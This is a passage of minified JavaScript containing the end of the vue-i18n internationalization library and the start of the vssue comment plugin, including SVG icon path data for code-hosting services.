la=/^\s?(?:true|false|-?[\d.]+|'[^']*'|"[^"]*")\s?$/;function ca(n){if(null==n)return"eof";switch(n.charCodeAt(0)){case 91:case 93:case 46:case 34:case 39:return n;case 95:case 36:case 45:return"ident";case 9:case 10:case 13:case 160:case 65279:case 8232:case 8233:return"ws"}return"ident"}function pa(n){var e,t,a,r=n.trim();return("0"!==n.charAt(0)||!isNaN(n))&&(a=r,la.test(a)?(t=(e=r).charCodeAt(0))!==e.charCodeAt(e.length-1)||34!==t&&39!==t?e:e.slice(1,-1):"*"+r)}var da=function(){this._cache=Object.create(null)};da.prototype.parsePath=function(n){var e=this._cache[n];return e||(e=function(n){var e,t,a,r,o,i,s,l=[],c=-1,p=0,d=0,u=[];function m(){var e=n[c+1];if(5===p&&"'"===e||6===p&&'"'===e)return c++,a="\\"+e,u[0](),!0}for(u[1]=function(){void 0!==t&&(l.push(t),t=void 0)},u[0]=function(){void 0===t?t=a:t+=a},u[2]=function(){u[0](),d++},u[3]=function(){if(d>0)d--,p=4,u[0]();else{if(d=0,void 0===t)return!1;if(!1===(t=pa(t)))return!1;u[1]()}};null!==p;)if(c++,"\\"!==(e=n[c])||!m()){if(r=ca(e),8===(o=(s=sa[p])[r]||s.else||8))return;if(p=o[0],(i=u[o[1]])&&(a=void 0===(a=o[2])?e:a,!1===i()))return;if(7===p)return l}}(n))&&(this._cache[n]=e),e||[]},da.prototype.getPathValue=function(n,e){if(!Bt(n))return null;var t=this.parsePath(e);if(0===t.length)return null;for(var a=t.length,r=n,o=0;o<a;){var i=r[t[o]];if(null==i)return null;r=i,o++}return r};var ua,ma=/<\/?[\w\s="/.':;#-\/]+>/,ha=/(?:@(?:\.[a-zA-Z]+)?:(?:[\w\-_|./]+|\([\w\-_:|./]+\)))/g,fa=/^@(?:\.([a-zA-Z]+))?:/,ba=/[()]/g,va={upper:function(n){return n.toLocaleUpperCase()},lower:function(n){return n.toLocaleLowerCase()},capitalize:function(n){return""+n.charAt(0).toLocaleUpperCase()+n.substr(1)}},ya=new ra,xa=function(n){var e=this;void 0===n&&(n={}),!Gt&&"undefined"!=typeof window&&window.Vue&&aa(window.Vue);var t=n.locale||"en-US",a=!1!==n.fallbackLocale&&(n.fallbackLocale||"en-US"),r=n.messages||{},o=n.dateTimeFormats||n.datetimeFormats||{},i=n.numberFormats||{};this._vm=null,this._formatter=n.formatter||ya,this._modifiers=n.modifiers||{},this._missing=n.missing||null,this._root=n.root||null,this._sync=void 0===n.sync||!!n.sync,this._fallbackRoot=void 0===n.fallbackRoot||!!n.fallbackRoot,this._fallbackRootWithEmptyString=void 0===n.fallbackRootWithEmptyString||!!n.fallbackRootWithEmptyString,this._formatFallbackMessages=void 0!==n.formatFallbackMessages&&!!n.formatFallbackMessages,this._silentTranslationWarn=void 0!==n.silentTranslationWarn&&n.silentTranslationWarn,this._silentFallbackWarn=void 0!==n.silentFallbackWarn&&!!n.silentFallbackWarn,this._dateTimeFormatters={},this._numberFormatters={},this._path=new da,this._dataListeners=new Set,this._componentInstanceCreatedListener=n.componentInstanceCreatedListener||null,this._preserveDirectiveContent=void 0!==n.preserveDirectiveContent&&!!n.preserveDirectiveContent,this.pluralizationRules=n.pluralizationRules||{},this._warnHtmlInMessage=n.warnHtmlInMessage||"off",this._postTranslation=n.postTranslation||null,this._escapeParameterHtml=n.escapeParameterHtml||!1,"__VUE_I18N_BRIDGE__"in n&&(this.__VUE_I18N_BRIDGE__=n.__VUE_I18N_BRIDGE__),this.getChoiceIndex=function(n,t){var a=Object.getPrototypeOf(e);if(a&&a.getChoiceIndex)return a.getChoiceIndex.call(e,n,t);var r,o;return e.locale in e.pluralizationRules?e.pluralizationRules[e.locale].apply(e,[n,t]):(r=n,o=t,r=Math.abs(r),2===o?r?r>1?1:0:1:r?Math.min(r,2):0)},this._exist=function(n,t){return!(!n||!t)&&(!Ft(e._path.getPathValue(n,t))||!!n[t])},"warn"!==this._warnHtmlInMessage&&"error"!==this._warnHtmlInMessage||Object.keys(r).forEach((function(n){e._checkLocaleMessage(n,e._warnHtmlInMessage,r[n])})),this._initVM({locale:t,fallbackLocale:a,messages:r,dateTimeFormats:o,numberFormats:i})},wa={vm:{configurable:!0},messages:{configurable:!0},dateTimeFormats:{configurable:!0},numberFormats:{configurable:!0},availableLocales:{configurable:!0},locale:{configurable:!0},fallbackLocale:{configurable:!0},formatFallbackMessages:{configurable:!0},missing:{configurable:!0},formatter:{configurable:!0},silentTranslationWarn:{configurable:!0},silentFallbackWarn:{configurable:!0},preserveDirectiveContent:{configurable:!0},warnHtmlInMessage:{configurable:!0},postTranslation:{configurable:!0},sync:{configurable:!0}};xa.prototype._checkLocaleMessage=function(n,e,t){var a=function(n,e,t,r){if(Dt(t))Object.keys(t).forEach((function(o){var i=t[o];Dt(i)?(r.push(o),r.push("."),a(n,e,i,r),r.pop(),r.pop()):(r.push(o),a(n,e,i,r),r.pop())}));else if(_t(t))t.forEach((function(t,o){Dt(t)?(r.push("["+o+"]"),r.push("."),a(n,e,t,r),r.pop(),r.pop()):(r.push("["+o+"]"),a(n,e,t,r),r.pop())}));else if(It(t)){if(ma.test(t)){var o="Detected HTML in message '"+t+"' of keypath '"+r.join("")+"' at '"+e+"'. Consider component interpolation with '<i18n>' to avoid XSS. See https://bit.ly/2ZqJzkp";"warn"===n?Et(o):"error"===n&&function(n,e){"undefined"!=typeof console&&(console.error("[vue-i18n] "+n),e&&console.error(e.stack))}(o)}}};a(e,n,t,[])},xa.prototype._initVM=function(n){var e=Gt.config.silent;Gt.config.silent=!0,this._vm=new Gt({data:n,__VUE18N__INSTANCE__:!0}),Gt.config.silent=e},xa.prototype.destroyVM=function(){this._vm.$destroy()},xa.prototype.subscribeDataChanging=function(n){this._dataListeners.add(n)},xa.prototype.unsubscribeDataChanging=function(n){!function(n,e){if(n.delete(e));}(this._dataListeners,n)},xa.prototype.watchI18nData=function(){var n=this;return this._vm.$watch("$data",(function(){for(var e,t,a=(e=n._dataListeners,t=[],e.forEach((function(n){return t.push(n)})),t),r=a.length;r--;)Gt.nextTick((function(){a[r]&&a[r].$forceUpdate()}))}),{deep:!0})},xa.prototype.watchLocale=function(n){if(n){if(!this.__VUE_I18N_BRIDGE__)return null;var e=this,t=this._vm;return this.vm.$watch("locale",(function(a){t.$set(t,"locale",a),e.__VUE_I18N_BRIDGE__&&n&&(n.locale.value=a),t.$forceUpdate()}),{immediate:!0})}if(!this._sync||!this._root)return null;var a=this._vm;return this._root.$i18n.vm.$watch("locale",(function(n){a.$set(a,"locale",n),a.$forceUpdate()}),{immediate:!0})},xa.prototype.onComponentInstanceCreated=function(n){this._componentInstanceCreatedListener&&this._componentInstanceCreatedListener(n,this)},wa.vm.get=function(){return this._vm},wa.messages.get=function(){return Mt(this._getMessages())},wa.dateTimeFormats.get=function(){return Mt(this._getDateTimeFormats())},wa.numberFormats.get=function(){return Mt(this._getNumberFormats())},wa.availableLocales.get=function(){return Object.keys(this.messages).sort()},wa.locale.get=function(){return this._vm.locale},wa.locale.set=function(n){this._vm.$set(this._vm,"locale",n)},wa.fallbackLocale.get=function(){return this._vm.fallbackLocale},wa.fallbackLocale.set=function(n){this._localeChainCache={},this._vm.$set(this._vm,"fallbackLocale",n)},wa.formatFallbackMessages.get=function(){return this._formatFallbackMessages},wa.formatFallbackMessages.set=function(n){this._formatFallbackMessages=n},wa.missing.get=function(){return this._missing},wa.missing.set=function(n){this._missing=n},wa.formatter.get=function(){return this._formatter},wa.formatter.set=function(n){this._formatter=n},wa.silentTranslationWarn.get=function(){return this._silentTranslationWarn},wa.silentTranslationWarn.set=function(n){this._silentTranslationWarn=n},wa.silentFallbackWarn.get=function(){return this._silentFallbackWarn},wa.silentFallbackWarn.set=function(n){this._silentFallbackWarn=n},wa.preserveDirectiveContent.get=function(){return this._preserveDirectiveContent},wa.preserveDirectiveContent.set=function(n){this._preserveDirectiveContent=n},wa.warnHtmlInMessage.get=function(){return this._warnHtmlInMessage},wa.warnHtmlInMessage.set=function(n){var e=this,t=this._warnHtmlInMessage;if(this._warnHtmlInMessage=n,t!==n&&("warn"===n||"error"===n)){var a=this._getMessages();Object.keys(a).forEach((function(n){e._checkLocaleMessage(n,e._warnHtmlInMessage,a[n])}))}},wa.postTranslation.get=function(){return this._postTranslation},wa.postTranslation.set=function(n){this._postTranslation=n},wa.sync.get=function(){return this._sync},wa.sync.set=function(n){this._sync=n},xa.prototype._getMessages=function(){return this._vm.messages},xa.prototype._getDateTimeFormats=function(){return this._vm.dateTimeFormats},xa.prototype._getNumberFormats=function(){return this._vm.numberFormats},xa.prototype._warnDefault=function(n,e,t,a,r,o){if(!Ft(t))return t;if(this._missing){var i=this._missing.apply(null,[n,e,a,r]);if(It(i))return i}else 0;if(this._formatFallbackMessages){var s=Lt.apply(void 0,r);return this._render(e,o,s.params,e)}return e},xa.prototype._isFallbackRoot=function(n){return(this._fallbackRootWithEmptyString?!n:Ft(n))&&!Ft(this._root)&&this._fallbackRoot},xa.prototype._isSilentFallbackWarn=function(n){return this._silentFallbackWarn instanceof RegExp?this._silentFallbackWarn.test(n):this._silentFallbackWarn},xa.prototype._isSilentFallback=function(n,e){return this._isSilentFallbackWarn(e)&&(this._isFallbackRoot()||n!==this.fallbackLocale)},xa.prototype._isSilentTranslationWarn=function(n){return this._silentTranslationWarn instanceof RegExp?this._silentTranslationWarn.test(n):this._silentTranslationWarn},xa.prototype._interpolate=function(n,e,t,a,r,o,i){if(!e)return null;var s,l=this._path.getPathValue(e,t);if(_t(l)||Dt(l))return l;if(Ft(l)){if(!Dt(e))return null;if(!It(s=e[t])&&!Ot(s))return null}else{if(!It(l)&&!Ot(l))return null;s=l}return It(s)&&(s.indexOf("@:")>=0||s.indexOf("@.")>=0)&&(s=this._link(n,e,s,a,"raw",o,i)),this._render(s,r,o,t)},xa.prototype._link=function(n,e,t,a,r,o,i){var s=t,l=s.match(ha);for(var c in l)if(l.hasOwnProperty(c)){var p=l[c],d=p.match(fa),u=d[0],m=d[1],h=p.replace(u,"").replace(ba,"");if(Nt(i,h))return s;i.push(h);var g=this._interpolate(n,e,h,a,"raw"===r?"string":r,"raw"===r?void 0:o,i);if(this._isFallbackRoot(g)){if(!this._root)throw Error("unexpected error");var f=this._root.$i18n;g=f._translate(f._getMessages(),f.locale,f.fallbackLocale,h,a,r,o)}g=this._warnDefault(n,h,g,a,_t(o)?o:[o],r),this._modifiers.hasOwnProperty(m)?g=this._modifiers[m](g):va.hasOwnProperty(m)&&(g=va[m](g)),i.pop(),s=g?s.replace(p,g):s}return s},xa.prototype._createMessageContext=function(n,e,t,a){var r=this,o=_t(n)?n:[],i=Bt(n)?n:{},s=this._getMessages(),l=this.locale;return{list:function(n){return o[n]},named:function(n){return i[n]},values:n,formatter:e,path:t,messages:s,locale:l,linked:function(n){return r._interpolate(l,s[l]||{},n,null,a,void 0,[n])}}},xa.prototype._render=function(n,e,t,a){if(Ot(n))return n(this._createMessageContext(t,this._formatter||ya,a,e));var r=this._formatter.interpolate(n,t,a);return r||(r=ya.interpolate(n,t,a)),"string"!==e||It(r)?r:r.join("")},xa.prototype._appendItemToChain=function(n,e,t){var a=!1;return Nt(n,e)||(a=!0,e&&(a="!"!==e[e.length-1],e=e.replace(/!/g,""),n.push(e),t&&t[e]&&(a=t[e]))),a},xa.prototype._appendLocaleToChain=function(n,e,t){var a,r=e.split("-");do{var o=r.join("-");a=this._appendItemToChain(n,o,t),r.splice(-1,1)}while(r.length&&!0===a);return a},xa.prototype._appendBlockToChain=function(n,e,t){for(var a=!0,r=0;r<e.length&&"boolean"==typeof a;r++){var o=e[r];It(o)&&(a=this._appendLocaleToChain(n,o,t))}return a},xa.prototype._getLocaleChain=function(n,e){if(""===n)return[];this._localeChainCache||(this._localeChainCache={});var t=this._localeChainCache[n];if(!t){e||(e=this.fallbackLocale),t=[];for(var a,r=[n];_t(r);)r=this._appendBlockToChain(t,r,e);(r=It(a=_t(e)?e:Bt(e)?e.default?e.default:null:e)?[a]:a)&&this._appendBlockToChain(t,r,null),this._localeChainCache[n]=t}return t},xa.prototype._translate=function(n,e,t,a,r,o,i){for(var s,l=this._getLocaleChain(e,t),c=0;c<l.length;c++){var p=l[c];if(!Ft(s=this._interpolate(p,n[p],a,r,o,i,[a])))return s}return null},xa.prototype._t=function(n,e,t,a){for(var r,o=[],i=arguments.length-4;i-- >0;)o[i]=arguments[i+4];if(!n)return"";var s=Lt.apply(void 0,o);this._escapeParameterHtml&&(s.params=Wt(s.params));var l=s.locale||e,c=this._translate(t,l,this.fallbackLocale,n,a,"string",s.params);if(this._isFallbackRoot(c)){if(!this._root)throw Error("unexpected error");return(r=this._root).$t.apply(r,[n].concat(o))}return c=this._warnDefault(l,n,c,a,o,"string"),this._postTranslation&&null!=c&&(c=this._postTranslation(c,n)),c},xa.prototype.t=function(n){for(var e,t=[],a=arguments.length-1;a-- >0;)t[a]=arguments[a+1];return(e=this)._t.apply(e,[n,this.locale,this._getMessages(),null].concat(t))},xa.prototype._i=function(n,e,t,a,r){var o=this._translate(t,e,this.fallbackLocale,n,a,"raw",r);if(this._isFallbackRoot(o)){if(!this._root)throw Error("unexpected error");return this._root.$i18n.i(n,e,r)}return this._warnDefault(e,n,o,a,[r],"raw")},xa.prototype.i=function(n,e,t){return n?(It(e)||(e=this.locale),this._i(n,e,this._getMessages(),null,t)):""},xa.prototype._tc=function(n,e,t,a,r){for(var o,i=[],s=arguments.length-5;s-- >0;)i[s]=arguments[s+5];if(!n)return"";void 0===r&&(r=1);var l={count:r,n:r},c=Lt.apply(void 0,i);return c.params=Object.assign(l,c.params),i=null===c.locale?[c.params]:[c.locale,c.params],this.fetchChoice((o=this)._t.apply(o,[n,e,t,a].concat(i)),r)},xa.prototype.fetchChoice=function(n,e){if(!n||!It(n))return null;var t=n.split("|");return t[e=this.getChoiceIndex(e,t.length)]?t[e].trim():n},xa.prototype.tc=function(n,e){for(var t,a=[],r=arguments.length-2;r-- >0;)a[r]=arguments[r+2];return(t=this)._tc.apply(t,[n,this.locale,this._getMessages(),null,e].concat(a))},xa.prototype._te=function(n,e,t){for(var a=[],r=arguments.length-3;r-- >0;)a[r]=arguments[r+3];var o=Lt.apply(void 0,a).locale||e;return this._exist(t[o],n)},xa.prototype.te=function(n,e){return this._te(n,this.locale,this._getMessages(),e)},xa.prototype.getLocaleMessage=function(n){return Mt(this._vm.messages[n]||{})},xa.prototype.setLocaleMessage=function(n,e){"warn"!==this._warnHtmlInMessage&&"error"!==this._warnHtmlInMessage||this._checkLocaleMessage(n,this._warnHtmlInMessage,e),this._vm.$set(this._vm.messages,n,e)},xa.prototype.mergeLocaleMessage=function(n,e){"warn"!==this._warnHtmlInMessage&&"error"!==this._warnHtmlInMessage||this._checkLocaleMessage(n,this._warnHtmlInMessage,e),this._vm.$set(this._vm.messages,n,Ut(void 0!==this._vm.messages[n]&&Object.keys(this._vm.messages[n]).length?Object.assign({},this._vm.messages[n]):{},e))},xa.prototype.getDateTimeFormat=function(n){return Mt(this._vm.dateTimeFormats[n]||{})},xa.prototype.setDateTimeFormat=function(n,e){this._vm.$set(this._vm.dateTimeFormats,n,e),this._clearDateTimeFormat(n,e)},xa.prototype.mergeDateTimeFormat=function(n,e){this._vm.$set(this._vm.dateTimeFormats,n,Ut(this._vm.dateTimeFormats[n]||{},e)),this._clearDateTimeFormat(n,e)},xa.prototype._clearDateTimeFormat=function(n,e){for(var t in e){var a=n+"__"+t;this._dateTimeFormatters.hasOwnProperty(a)&&delete this._dateTimeFormatters[a]}},xa.prototype._localizeDateTime=function(n,e,t,a,r,o){for(var i=e,s=a[i],l=this._getLocaleChain(e,t),c=0;c<l.length;c++){var p=l[c];if(i=p,!Ft(s=a[p])&&!Ft(s[r]))break}if(Ft(s)||Ft(s[r]))return null;var d,u=s[r];if(o)d=new Intl.DateTimeFormat(i,Object.assign({},u,o));else{var m=i+"__"+r;(d=this._dateTimeFormatters[m])||(d=this._dateTimeFormatters[m]=new Intl.DateTimeFormat(i,u))}return d.format(n)},xa.prototype._d=function(n,e,t,a){if(!t)return(a?new Intl.DateTimeFormat(e,a):new Intl.DateTimeFormat(e)).format(n);var r=this._localizeDateTime(n,e,this.fallbackLocale,this._getDateTimeFormats(),t,a);if(this._isFallbackRoot(r)){if(!this._root)throw Error("unexpected error");return this._root.$i18n.d(n,t,e)}return r||""},xa.prototype.d=function(n){for(var e=[],t=arguments.length-1;t-- >0;)e[t]=arguments[t+1];var a=this.locale,r=null,o=null;return 1===e.length?(It(e[0])?r=e[0]:Bt(e[0])&&(e[0].locale&&(a=e[0].locale),e[0].key&&(r=e[0].key)),o=Object.keys(e[0]).reduce((function(n,t){var a;return Nt(At,t)?Object.assign({},n,((a={})[t]=e[0][t],a)):n}),null)):2===e.length&&(It(e[0])&&(r=e[0]),It(e[1])&&(a=e[1])),this._d(n,a,r,o)},xa.prototype.getNumberFormat=function(n){return Mt(this._vm.numberFormats[n]||{})},xa.prototype.setNumberFormat=function(n,e){this._vm.$set(this._vm.numberFormats,n,e),this._clearNumberFormat(n,e)},xa.prototype.mergeNumberFormat=function(n,e){this._vm.$set(this._vm.numberFormats,n,Ut(this._vm.numberFormats[n]||{},e)),this._clearNumberFormat(n,e)},xa.prototype._clearNumberFormat=function(n,e){for(var t in e){var a=n+"__"+t;this._numberFormatters.hasOwnProperty(a)&&delete this._numberFormatters[a]}},xa.prototype._getNumberFormatter=function(n,e,t,a,r,o){for(var i=e,s=a[i],l=this._getLocaleChain(e,t),c=0;c<l.length;c++){var p=l[c];if(i=p,!Ft(s=a[p])&&!Ft(s[r]))break}if(Ft(s)||Ft(s[r]))return null;var d,u=s[r];if(o)d=new Intl.NumberFormat(i,Object.assign({},u,o));else{var m=i+"__"+r;(d=this._numberFormatters[m])||(d=this._numberFormatters[m]=new Intl.NumberFormat(i,u))}return d},xa.prototype._n=function(n,e,t,a){if(!xa.availabilities.numberFormat)return"";if(!t)return(a?new Intl.NumberFormat(e,a):new Intl.NumberFormat(e)).format(n);var r=this._getNumberFormatter(n,e,this.fallbackLocale,this._getNumberFormats(),t,a),o=r&&r.format(n);if(this._isFallbackRoot(o)){if(!this._root)throw Error("unexpected error");return this._root.$i18n.n(n,Object.assign({},{key:t,locale:e},a))}return o||""},xa.prototype.n=function(n){for(var e=[],t=arguments.length-1;t-- >0;)e[t]=arguments[t+1];var a=this.locale,r=null,o=null;return 1===e.length?It(e[0])?r=e[0]:Bt(e[0])&&(e[0].locale&&(a=e[0].locale),e[0].key&&(r=e[0].key),o=Object.keys(e[0]).reduce((function(n,t){var a;return Nt(Pt,t)?Object.assign({},n,((a={})[t]=e[0][t],a)):n}),null)):2===e.length&&(It(e[0])&&(r=e[0]),It(e[1])&&(a=e[1])),this._n(n,a,r,o)},xa.prototype._ntp=function(n,e,t,a){if(!xa.availabilities.numberFormat)return[];if(!t)return(a?new Intl.NumberFormat(e,a):new Intl.NumberFormat(e)).formatToParts(n);var r=this._getNumberFormatter(n,e,this.fallbackLocale,this._getNumberFormats(),t,a),o=r&&r.formatToParts(n);if(this._isFallbackRoot(o)){if(!this._root)throw Error("unexpected error");return this._root.$i18n._ntp(n,e,t,a)}return o||[]},Object.defineProperties(xa.prototype,wa),Object.defineProperty(xa,"availabilities",{get:function(){if(!ua){var n="undefined"!=typeof Intl;ua={dateTimeFormat:n&&void 0!==Intl.DateTimeFormat,numberFormat:n&&void 0!==Intl.NumberFormat}}return ua}}),xa.install=aa,xa.version="8.28.2";var ka=xa;
/*!
 * vssue - A vue-powered issue-based comment plugin
 *
 * @version v1.4.8
 * @link https://vssue.js.org
 * @license MIT
 * @copyright 2018-2021 meteorlxy
 */
/*! *****************************************************************************
Copyright (c) Microsoft Corporation. All rights reserved.
Licensed under the Apache License, Version 2.0 (the "License"); you may not use
this file except in compliance with the License. You may obtain a copy of the
License at http://www.apache.org/licenses/LICENSE-2.0

THIS CODE IS PROVIDED ON AN *AS IS* BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
KIND, EITHER EXPRESS OR IMPLIED, INCLUDING WITHOUT LIMITATION ANY IMPLIED
WARRANTIES OR CONDITIONS OF TITLE, FITNESS FOR A PARTICULAR PURPOSE,
MERCHANTABLITY OR NON-INFRINGEMENT.

See the Apache Version 2.0 License for specific language governing permissions
and limitations under the License.
***************************************************************************** */function Sa(n,e,t,a){var r,o=arguments.length,i=o<3?e:null===a?a=Object.getOwnPropertyDescriptor(e,t):a;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)i=Reflect.decorate(n,e,t,a);else for(var s=n.length-1;s>=0;s--)(r=n[s])&&(i=(o<3?r(i):o>3?r(e,t,i):r(e,t))||i);return o>3&&i&&Object.defineProperty(e,t,i),i}var Ca=a.a.extend({name:"Iconfont"});function Ta(n,e,t,a,r,o,i,s,l,c){"boolean"!=typeof i&&(l=s,s=i,i=!1);const p="function"==typeof t?t.options:t;let d;if(n&&n.render&&(p.render=n.render,p.staticRenderFns=n.staticRenderFns,p._compiled=!0,r&&(p.functional=!0)),a&&(p._scopeId=a),o?(d=function(n){(n=n||this.$vnode&&this.$vnode.ssrContext||this.parent&&this.parent.$vnode&&this.parent.$vnode.ssrContext)||"undefined"==typeof __VUE_SSR_CONTEXT__||(n=__VUE_SSR_CONTEXT__),e&&e.call(this,l(n)),n&&n._registeredComponents&&n._registeredComponents.add(o)},p._ssrRegister=d):e&&(d=i?function(n){e.call(this,c(n,this.$root.$options.shadowRoot))}:function(n){e.call(this,s(n))}),d)if(p.functional){const n=p.render;p.render=function(e,t){return d.call(t),n(e,t)}}else{const n=p.beforeCreate;p.beforeCreate=n?[].concat(n,d):[d]}return t}"undefined"!=typeof navigator&&/msie [6-9]\\b/.test(navigator.userAgent.toLowerCase());const ja=Ta({render:function(n,e){var t=e._c;return t("svg",{directives:[{name:"show",rawName:"v-show",value:!1,expression:"false"}]},[t("symbol",{attrs:{id:"vssue-icon-bitbucket",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M579.5522464 489.45249493q4.8371808 38.38537173-30.81752427 61.55702827t-67.95459093 3.66689493q-23.79580907-10.37653333-32.6119616-35.34262826t-0.31207573-50.01020907 31.67573333-35.34262827q21.92335253-11.00068587 44.1587808-7.33379093t39.00952427 21.61127573 16.77409493 41.1160384zM647.19476053 476.65737173q-8.50407573-65.22392427-68.8908192-99.9424t-120.07131413-7.9579424q-38.38537173 17.08617173-61.24495253 53.9111616t-21.0651424 78.95527574q2.41859093 55.4715424 47.20152426 94.48106666t100.87862827 34.1723424q55.4715424-4.8371808 92.60860907-51.18049493t30.50544746-102.43900907zM792.93434133 146.32472427q-12.17097173-16.4620192-34.1723424-27.15062827t-35.34262826-13.41927573-43.30057174-7.64586667q-177.33729493-28.63299093-345.00022826 1.24830507-26.2144 4.29104747-40.25782827 7.33379093t-33.54819093 13.41927573-30.50544747 26.2144q18.2564576 17.08617173 46.34331413 27.6967616t44.78293334 13.41927574 53.36502826 7.02171413q138.95192427 17.71032427 273.06666667 0.62415253 38.38537173-4.8371808 54.53531413-7.33379093t44.1587808-13.1072 45.7191616-28.32091413zM827.65281813 777.10872427q-4.8371808 15.83786667-9.44030506 46.65539093t-8.50407574 51.18049493-17.39824746 42.6764192-35.34262827 34.4064q-52.4288 29.2571424-115.46819093 43.61264747t-123.1140576 13.41927573-122.8019808-11.3127616q-28.0088384-4.8371808-49.69813334-11.00068586t-46.65539093-16.4620192-44.4708576-26.52647574-31.67573333-37.4491424q-15.21371413-58.51428587-34.71847574-177.96144746l3.66689494-9.7523808 11.00068586-5.46133334q135.9091808 90.1900192 308.72137174 90.1900192t309.34552426-90.1900192q12.79512427 3.66689493 14.5895616 14.04342827t-3.0427424 27.46270507-4.8371808 22.54750506zM937.97175147 191.41973333q-15.83786667 101.8148576-67.64251414 399.22346667-3.0427424 18.2564576-16.4620192 34.1723424t-26.52647573 24.3419424-33.23611413 18.88060907q-153.61950507 76.7707424-371.8387808 53.67710506-151.12289493-16.4620192-240.14262827-84.72868586-9.12822827-7.33379093-15.52579093-16.1499424t-10.37653334-21.2992-5.46133333-20.75306667-3.66689493-24.10788587-3.3548192-21.2992q-5.46133333-30.50544747-16.1499424-91.43832426t-17.08617174-98.4600384-14.35550506-89.8779424-13.41927574-96.27550507q1.7944384-15.83786667 10.68860907-29.5692192t19.19268587-22.8595808 27.46270506-18.2564576 28.0088384-13.73135253 29.2571424-11.3127616q76.22460907-28.0088384 190.75657174-39.00952427 231.0144-22.54750507 412.01859093 30.50544747 94.48106667 28.0088384 131.072 74.35215253 9.7523808 12.17097173 10.0644576 31.0515808t-3.3548192 32.9240384z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-gitea",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M184.31868985 236.10860742C106.94832667 235.94086648 3.32655508 285.13080468 9.02973665 408.46209936c8.93218827 192.65010787 206.32096845 210.5144844 285.20099725 212.06608453 8.63864186 36.14810496 101.48307766 160.77938883 170.21479898 167.32127321h301.09442177c180.57278288-11.99345499 315.77172611-546.07960359 215.54670217-548.09249109-165.7696721 7.79993906-264.02374305 11.74184405-348.27147151 12.41280591v166.69224585l-26.25140843-11.61603761-0.16773997-154.99233728c-96.70246985-0.04193548-181.83083757-4.52899687-343.4069947-12.49667687-20.21274496-0.12580547-48.39316992-3.5644886-78.67035236-3.64835859z m10.94507577 68.14462849h9.22573371c10.98701124 98.75729283 28.85138778 156.50200291 64.99949274 244.73357185-92.25734394-10.90314029-170.75995634-37.69970509-185.18564974-137.75698809-7.46445813-51.78991757 17.69663558-105.84433456 110.96042329-107.01851827z m358.83913087 97.07988723c6.29027343 0.08386999 12.70635233 1.25805468 18.74501482 4.02577499l31.40943263 13.54505513-22.51917887 41.05451824a28.18042496 25.03528825 0 0 0-10.10637297 1.59353561 28.18042496 25.03528825 0 0 0-16.98373825 32.038459 28.18042496 25.03528825 0 0 0 4.69673781 7.29671718l-38.83195528 70.70267333a28.18042496 25.03528825 0 0 0-9.30960467 1.59353659 28.18042496 25.03528825 0 0 0-16.98373825 32.038459 28.18042496 25.03528825 0 0 0 36.06423497 15.09665623 28.18042496 25.03528825 0 0 0 16.94180276-32.08039449 28.18042496 25.03528825 0 0 0-6.62575434-9.22573468l37.82551056-68.85752581a28.18042496 25.03528825 0 0 0 12.28700044-1.25805469 28.18042496 25.03528825 0 0 0 8.93218826-4.69673783c14.59343435 6.12253248 26.54495386 11.11281671 35.14166122 15.34826717 12.91602778 6.37414341 17.48696012 10.60959485 18.87082027 15.30633169 1.38386015 4.61286685-0.12580547 13.50312062-7.42252263 29.10299872-5.45157063 11.61603859-14.46762889 28.09655497-25.11915823 47.51253164a28.18042496 25.03528825 0 0 0-10.52572486 1.59353659 28.18042496 25.03528825 0 0 0-16.98373826 32.038459 28.18042496 25.03528825 0 0 0 36.06423498 15.09665623 28.18042496 25.03528825 0 0 0 16.94180278-32.03845901 28.18042496 25.03528825 0 0 0-5.74511608-8.47090188c10.52572388-19.20630122 19.58371762-35.72875308 25.41270465-48.14155897 7.88380904-16.85793279 11.99345499-29.39654416 8.38703091-41.51580463-3.60642311-12.11926046-14.67730434-20.0030695-29.35460966-27.25785217-9.6450856-4.73867233-21.68047607-9.77089106-36.06423399-15.80955357a28.18042496 25.03528825 0 0 0-1.59353562-10.022502 28.18042496 25.03528825 0 0 0-6.08059796-8.7644483l22.14176246-40.38355541 122.61839638 52.96410227c22.14176247 9.6031511 31.2836262 33.12877372 20.54822685 52.8382968l-84.28966393 154.32137544c-10.77733482 19.66758857-37.23841869 27.80300855-59.38018118 18.24179293l-173.48574115-74.98005927c-22.14176247-9.5612156-31.32556167-33.12877372-20.54822687-52.83829679l84.28966395-154.27943995c7.38058716-13.54505513 22.22563246-21.59660511 37.951317-22.22563246h2.68384935z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-gitee",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M978.404275 409.561604H455.061338c-25.117645 0-45.499734 20.382089-45.499734 45.499734l-0.031997 113.781333c0 25.117645 20.350092 45.499734 45.499734 45.531731h318.594132c25.117645 0 45.499734 20.382089 45.499734 45.499735v22.749867a136.5312 136.5312 0 0 1-136.5312 136.5312H250.248539a45.499734 45.499734 0 0 1-45.499734-45.499734V341.343999a136.5312 136.5312 0 0 1 136.5312-136.5312L978.308284 204.780802c25.117645 0 45.499734-20.350092 45.499734-45.467738L1023.904009 45.531731h0.031997A45.499734 45.499734 0 0 0 978.468269 0h-0.031997L341.343999 0.031997C152.84967 0.031997 0.031997 152.84967 0.031997 341.343999v637.092273c0 25.117645 20.382089 45.499734 45.499734 45.499734h671.233072a307.171203 307.171203 0 0 0 307.171203-307.171203v-261.671468c0-25.117645-20.382089-45.499734-45.499734-45.499734z"}})]),e._v(" "),t("symbol",{attrs:{id:"vssue-icon-github",viewBox:"0 0 1024 1024"}},[t("path",{attrs:{d:"M512 20.4425c-278.334 0-504 225.6345-504 504 0 222.6735 144.4275 411.6105 344.673 478.233 25.2 4.662 34.461-10.9305 34.461-24.255 0-12.0015-0.4725-51.723-0.693-93.8385-140.238 30.492-169.8165-59.472-169.8165-59.472-22.932-58.2435-55.944-73.7415-55.944-73.7415-45.738-31.2795 3.465-30.6495 3.465-30.6495 50.589 3.5595 77.238 51.9435 77.238 51.9435 44.9505 77.049 117.9045 54.7785 146.664 41.895 4.5045-32.571 17.577-54.81 32.004-67.41-111.951-12.726-229.635-55.9755-229.635-249.0705 0-55.0305 19.6875-99.981 51.9435-135.2925-5.229-12.6945-22.491-63.945 4.8825-133.371 0 0 42.336-13.545 138.6315 51.66 40.194-11.1825 83.3175-16.758 126.1575-16.9785 42.8085 